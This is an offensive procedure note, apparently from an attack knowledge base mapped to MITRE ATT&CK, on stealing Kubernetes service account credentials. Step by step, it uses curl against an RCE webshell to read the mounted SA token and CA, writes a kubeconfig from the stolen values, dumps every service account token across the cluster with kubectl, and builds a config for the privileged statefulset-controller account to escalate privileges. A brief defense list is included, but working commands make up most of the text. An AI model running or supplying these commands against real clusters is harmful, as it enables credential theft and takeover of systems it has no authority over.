---
id: proc-007
tags:
  - token-theft
  - kubeconfig
  - escalation
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/kubectl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-extract-ingress-sa-creds]]'
  - '[[commands/kubectl-dump-all-sa-tokens]]'
  - '[[commands/bash-generate-ingress-kubeconfig]]'
  - '[[commands/bash-generate-sa-kubeconfig]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credentials In Files]]'
updated_at: '2025-12-14T17:23:49.910Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Credentials In Files]]'
---
# Extract-Service-Account-Tokens-and-Generate-Kubeconfig

## Summary

This procedure uses the RCE webshell to extract the ingress SA's CA, token, and namespace, generates a kubeconfig for it, dumps all cluster SA tokens, and creates configs for privileged SAs to enable escalation.

## Description

SA tokens are mounted at /var/run/secrets/kubernetes.io/serviceaccount. Commands base64 the CA, cat the token/namespace. Kubeconfigs are built with these for API access. Dumping secrets uses jsonpath to extract tokens cluster-wide. Target privileged SAs like statefulset-controller for higher perms.

## Requirements

1. Active RCE via webshell.
2. kubectl with ingress kubeconfig (generated here).
3. API server URL (e.g., https://127.0.0.1:36923 from Kind).
4. base64 utility on host.

## Defense

Defensive measures and detection strategies:

- Use token projection with expiration.
- Restrict SA token access via IRSA or workload identities.
- Monitor secret reads via audit logs.
- Limit SA scopes with minimal RBAC.

## Objectives

1. Steal ingress SA credentials.
2. Generate usable kubeconfig.
3. Enumerate and extract other SA tokens.
4. Prepare for privilege escalation.

## Instructions

### Step 1: Extract Credentials via Webshell

**Context**: Use curl to run cmds for CA (base64), token, namespace.

**Command** ([[commands/curl-extract-ingress-sa-creds]]):

```bash
ca=$(curl -s -H "host: x.x" localhost/z/ -d "cmd=base64 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -w 0")
token=$(curl -s -H "host: x.x" localhost/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")
namespace=$(curl -s -H "host: x.x" localhost/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")
```

> Expected output: Variables populated with values.

### Step 2: Generate Ingress Kubeconfig

**Context**: Build kubeconfig YAML with extracted values.

**Command** ([[commands/bash-generate-ingress-kubeconfig]]):

```bash
cat > ingress.kubeconfig <<EOF
apiVersion: v1
kind: Config
clusters:
- name: default-cluster
  cluster:
    certificate-authority-data: ${ca}
    server: https://127.0.0.1:36923
contexts:
- name: default-context
  context:
    cluster: default-cluster
    namespace: default
    user: default-user
current-context: default-context
users:
- name: default-user
  user:
    token: ${token}
EOF
```

> Expected output: ingress.kubeconfig file created.

### Step 3: Dump All SA Tokens

**Context**: Use generated config to query secrets.

**Command** ([[commands/kubectl-dump-all-sa-tokens]]):

```bash
kubectl --kubeconfig ingress.kubeconfig get secrets -A -o=jsonpath='{range .items[?(@.type=="kubernetes.io/service-account-token")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.data.token}{"\n"}{end}'
```

> Expected output: Lines of "namespace secretname tokenbase64".

### Step 4: Generate Privileged SA Kubeconfig

**Context**: Target specific SA, extract token/CA, build config.

**Command** ([[commands/bash-generate-sa-kubeconfig]]):

```bash
sa=statefulset-controller
token=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o jsonpath="{range .items[?(@.metadata.annotations['kubernetes.io/service-account.name']=='$sa')]}{.data.token}{end}"| base64 --decode)
ca=$(kubectl --kubeconfig ingress.kubeconfig get secrets -A -o jsonpath="{range .items[?(@.metadata.annotations['kubernetes.io/service-account.name']=='$sa')]}{.data['ca.crt']}{end}")
cat > sa.kubeconfig <<EOF
apiVersion: v1
kind: Config
clusters:
- name: default-cluster
  cluster:
    certificate-authority-data: ${ca}
    server: https://127.0.0.1:36923
contexts:
- name: default-context
  context:
    cluster: default-cluster
    namespace: default
    user: default-user
current-context: default-context
users:
- name: default-user
  user:
    token: ${token}
EOF
```

> Expected output: sa.kubeconfig created; test with `kubectl --kubeconfig sa.kubeconfig get pods`.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Credentials In Files]] Credentials In Files

### Sub-Techniques


## Commands Used

- [[commands/curl-extract-ingress-sa-creds]]
- [[commands/kubectl-dump-all-sa-tokens]]
- [[commands/bash-generate-ingress-kubeconfig]]
- [[commands/bash-generate-sa-kubeconfig]]

## Tools Used

- [[tools/curl]]
- [[tools/kubectl]]

## Tags

- token-theft
- kubeconfig
- escalation
